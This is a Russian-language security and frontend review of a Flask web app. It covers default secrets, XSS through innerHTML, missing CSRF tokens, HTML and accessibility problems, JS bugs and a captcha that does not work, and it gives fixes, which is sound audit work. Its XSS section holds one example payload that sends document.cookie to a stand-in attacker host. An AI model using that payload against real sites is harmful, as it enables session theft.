# Отчёт по ревью безопасности, фронтенда и документации


---

## 4.1. Ревью безопасности

### 4.1.1. Хранение секретов и паролей

#### Сильные стороны

- **Пароли хешируются** через `werkzeug.security.generate_password_hash` (PBKDF2 + salt) — `app/auth.py`. ✅
- **Проверка пароля** — через `check_password_hash` (безопасное сравнение). ✅
- **Секретный ключ** читается из переменной окружения `SECRET_KEY`, а не захардкожен. ✅
- **Загрузка `.env`** через `python-dotenv` — секреты не попадают в репозиторий (при условии, что `.env` в `.gitignore`). ✅

#### Проблемы

| № | Проблема | Файл | Приоритет |
|---|----------|------|-----------|
| 1 | **Дефолтный `SECRET_KEY`** — `"production-is-system-secret-key-change-me"`. Если переменная окружения не задана, приложение запустится с предсказуемым ключом → компрометация сессий. | `app/config.py` | **Критический** |
| 2 | **Дефолтный пароль БД** — `"12345"` в `_build_database_url()`. Если `DATABASE_PASSWORD` не задан, используется слабый пароль. | `app/config.py` | **Высокий** |
| 3 | **`TestingConfig`** использует PostgreSQL-URL с паролем `12345` (`postgresql://postgres:12345@localhost/test_production_db`). Для тестов лучше `sqlite:///:memory:`. | `app/config.py` | Средний |
| 4 | **Пароли-заглушки в `schema.sql`** — `pbkdf2:sha256:260000$admin$dummyhash`. Реальная авторизация с ними не работает, но они создают иллюзию «готовых» пользователей. | `database/schema.sql` | Средний |
| 5 | **`.env` не проверен на наличие в `.gitignore`** — требуется проверка. | корень проекта | **Высокий** |
| 6 | **`SQLALCHEMY_ECHO`** может логировать SQL с параметрами (включая потенциально чувствительные данные) при `true`. В продакшене должен быть `false`. | `app/config.py` | Средний |



## 4.3. Ревью фронтенд-части `web/`

**Проверены шаблоны:** `base-dashboard.html`, `login.html`, `dashboard.html`, `admin-dashboard.html`, `clients.html`, `materials.html`, `operations.html`, `products.html`, `production-orders.html`, `sales-orders.html` (частично).

### 4.3.1. XSS-уязвимости (критично)

Во **всех** шаблонах используется `innerHTML` с интерполяцией пользовательских данных. Это **XSS**.

| Шаблон | Уязвимая строка | Риск |
|--------|-----------------|------|
| `admin-dashboard.html` | `<td>${user.login}</td>`, `${user.role}` | XSS через логин/роль |
| `clients.html` | `${client.name}`, `onclick='editClient(${JSON.stringify(client)})'` | XSS + синтаксическая ошибка |
| `materials.html` | `${material.name}`, `${material.code}`, `editMaterial(${JSON.stringify(material)})` | XSS |
| `operations.html` | `${operation.name}`, `${operation.code}` | XSS |
| `products.html` | `${product.name}`, `${product.code}` | XSS |
| `production-orders.html` | `${order.order_number}`, `${item.product_name}`, `${mat.material_name}`, `${op.operation_name}`, `${order.status}` | XSS |
| `sales-orders.html` | `${order.order_number}` | XSS |
| `base-dashboard.html` | `showNotification` — `innerHTML` с `${title}`, `${message}` | XSS через `result.message` из API |

**Пример атаки:** админ создаёт пользователя с логином `<img src=x onerror="fetch('https://evil.com?c='+document.cookie)">`. При открытии `admin-dashboard.html` другим админом — cookie утекают.

**Решение:** использовать `textContent` / `createElement` + `textContent` вместо `innerHTML` с интерполяцией. Для `showNotification` — `title` и `message` через `textContent`.

### 4.3.2. CSRF-уязвимости

| Шаблон | Проблема |
|--------|----------|
| `base-dashboard.html` | `<form method="POST" action="/logout">` без `csrf_token` |
| `login.html` | `<form method="POST" action="/" novalidate>` без `csrf_token` |
| Все `fetch` | `credentials: 'include'` без CSRF-токена |

**Решение:** подключить `CSRFProtect` и добавить `{{ csrf_token() }}` в формы + заголовок `X-CSRFToken` в `fetch`.

### 4.3.3. Валидность HTML

| Шаблон | Проблема |
|--------|----------|
| `production-orders.html` | `<div class="form-group">` открыт дважды, один не закрыт |
| `production-orders.html` | `<form>` содержит `<div class="modal-body" style="display:none;">` — форма не отображается |
| `base-dashboard.html` | 400+ строк `<style>` в `<head>` — лучше вынести в `styles.css` |
| `login.html` | 150+ строк `<style>` в `<head>` — вынести в `styles.css` |

### 4.3.4. Согласованность стилей

| Проблема | Где |
|----------|-----|
| Инлайн-стили дублируют `styles.css` | `production-orders.html`, `login.html` |
| `style="display:none;"` вместо класса | `admin-dashboard.html`, `clients.html`, `materials.html`, `operations.html`, `products.html`, `production-orders.html` |
| `status-badge` определён только в `production-orders.html` | не переиспользуется |
| `puzzle-grid` — фиксированные 150×150, не адаптивно | `login.html` |

### 4.3.5. Тексты интерфейса

| Проблема | Где | Рекомендация |
|----------|-----|--------------|
| «Попытки» — непонятно | `admin-dashboard.html` | «Неудачные попытки» |
| «Клиент ID» — неинформативно | `production-orders.html` | «Клиент» + имя |
| `${order.client_id.substring(0, 8)}...` | `production-orders.html` | Показывать имя клиента |
| «Авторизация успешна» vs «Вы успешно авторизовались» | API | Унифицировать |

### 4.3.6. Доступность (a11y)

| Проблема | Где |
|----------|-----|
| Кнопки `✏️`, `🔒`, `🗑️` без `aria-label` / `title` | все таблицы |
| `<div class="sidebar-logo">ПИС</div>` — не семантично | `base-dashboard.html` |
| Нет `aria-current="page"` у активного пункта меню | `base-dashboard.html` |
| `alt="Piece 0"` на английском | `login.html` |
| `novalidate` отключает HTML5-валидацию | `login.html` |

### 4.3.7. JS-логика (баги)

| Проблема | Шаблон |
|----------|--------|
| `saveMaterial` / `saveOperation` всегда `PUT` — создание не работает | `materials.html`, `operations.html` |
| `editClient(${JSON.stringify(client)})` — ломается на кавычках | `clients.html` |
| `editUser(..., '${user.login}', ...)` — ломается на `'` | `admin-dashboard.html` |
| Форма `production-orders` не отправляется (нет кнопки «Сохранить» в модалке) | `production-orders.html` |
| `viewOrder` перезаписывает `modal-body`, уничтожая форму | `production-orders.html` |
| `updateItemTotal` — заглушка | `production-orders.html` |
| `puzzle_captcha` — `token` не передаётся в форму, проверка невозможна | `login.html` |
| `console.error` в проде | `sales-orders.html` |

### 4.3.8. Капча (критично)

- В `login.html` есть drag-n-drop пазл, скрытые поля `order0..order3`.
- **Но:** `token` от `/api/puzzle-captcha/generate` **не запрашивается** и **не передаётся** в форму.
- На сервере (`web.py`) `captcha_ok = True` — капча отключена.
- **Итог:** капча — **декоративная**, не защищает.

**Решение:**
1. При загрузке `login.html` — `fetch('/api/puzzle-captcha/generate')` → сохранить `token` в скрытое поле.
2. При submit — отправить `token` + `fragment_order` (4 значения `order`).
3. В `web.py` — вызвать `puzzle_captcha.verify(token, fragment_order)`.
4. Только если `True` — проверять логин/пароль.